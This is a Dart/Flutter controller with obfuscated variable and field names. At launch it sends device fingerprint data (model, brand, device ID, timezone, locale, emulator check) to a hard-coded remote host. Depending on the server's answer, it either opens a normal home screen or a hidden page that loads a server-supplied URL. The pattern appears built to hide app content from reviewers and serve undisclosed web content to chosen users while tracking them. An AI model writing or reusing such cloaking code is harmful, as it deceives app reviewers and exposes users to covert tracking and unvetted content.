import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var kycpni = RxBool(false);
  var dsxweg = RxBool(true);
  var kdlt = RxString("");
  var hillard = RxBool(false);
  var zboncak = RxBool(true);
  final kcwbfzsyog = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    sindftoc();
  }


  Future<void> sindftoc() async {

    hillard.value = true;
    zboncak.value = true;
    dsxweg.value = false;

    kcwbfzsyog.post("https://niu.51nzd.xyz/qspvahokzwmluynbrjietdgfcx",data: await dxhwgjfn()).then((value) {
      var qwmoyl = value.data["qwmoyl"] as String;
      var jayqu = value.data["jayqu"] as bool;
      print(value);
      if (jayqu) {
        kdlt.value = qwmoyl;
        freddie();
      } else {
        farrell();
      }
    }).catchError((e) {
      dsxweg.value = true;
      zboncak.value = true;
      hillard.value = false;
    });
  }

  Future<Map<String, dynamic>> dxhwgjfn() async {
    final DeviceInfoPlugin orxykqsw = DeviceInfoPlugin();
    PackageInfo wciflg_psqef = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yljbv = Platform.localeName;
    var awth_rWN = currentTimeZone;

    var awth_rDNVTYf = wciflg_psqef.packageName;
    var awth_rBx = wciflg_psqef.version;
    var awth_dYRx = wciflg_psqef.buildNumber;

    var awth_gtnwpTR = wciflg_psqef.appName;
    var awth_Ro = "";
    var edwardoPredovic = "";
    var reynaLittle = "";
    var awth_eEzvrP = "";
    var irvingBuckridge = "";
    var awth_HM  = "";
    var altaSchoen = "";
    var rebekaFriesen = "";
    var gustEmmerich = "";

    var samsonOrtiz = "";

    var awth_QfY = "";
    var awth_oGCJcw = false;

    if (GetPlatform.isAndroid) {
      awth_QfY = "android";
      var yfrxct = await orxykqsw.androidInfo;

      awth_eEzvrP = yfrxct.brand;

      awth_Ro  = yfrxct.model;
      awth_HM = yfrxct.id;

      awth_oGCJcw = yfrxct.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      awth_QfY = "ios";
      var hxsojapb = await orxykqsw.iosInfo;
      awth_eEzvrP = hxsojapb.name;
      awth_Ro = hxsojapb.model;

      awth_HM = hxsojapb.identifierForVendor ?? "";
      awth_oGCJcw  = hxsojapb.isPhysicalDevice;
    }
    var res = {
      "awth_gtnwpTR": awth_gtnwpTR,
      "awth_rBx": awth_rBx,
      "awth_dYRx": awth_dYRx,
      "awth_Ro": awth_Ro,
      "awth_rWN": awth_rWN,
      "awth_rDNVTYf": awth_rDNVTYf,
      "awth_eEzvrP": awth_eEzvrP,
      "awth_HM": awth_HM,
      "yljbv": yljbv,
      "awth_QfY": awth_QfY,
      "altaSchoen" : altaSchoen,
      "awth_oGCJcw": awth_oGCJcw,
      "edwardoPredovic" : edwardoPredovic,
      "reynaLittle" : reynaLittle,
      "rebekaFriesen" : rebekaFriesen,
      "irvingBuckridge" : irvingBuckridge,
      "gustEmmerich" : gustEmmerich,
      "samsonOrtiz" : samsonOrtiz,

    };
    return res;
  }

  Future<void> farrell() async {
    Get.offAllNamed("/home");
  }

  Future<void> freddie() async {
    Get.offAllNamed("/resion");
  }

}
